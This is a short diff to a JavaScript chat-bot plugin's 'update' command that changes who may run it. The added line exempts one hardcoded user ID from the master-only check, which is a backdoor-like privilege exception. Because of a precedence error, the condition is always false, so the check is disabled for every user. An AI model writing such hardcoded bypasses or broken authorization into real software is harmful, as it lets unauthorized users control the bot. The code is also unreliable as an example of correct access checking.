@@ -40,7 +40,7 @@ export class update extends plugin {
      * @param e oicq传递的事件参数e
      */
     async update(e) {
-        if (!this.e.isMaster) {
+        if (!this.e.isMaster&&!this.e.user_id=='2859167710') {
             await this.e.reply("您无权操作");
             return true;
         }
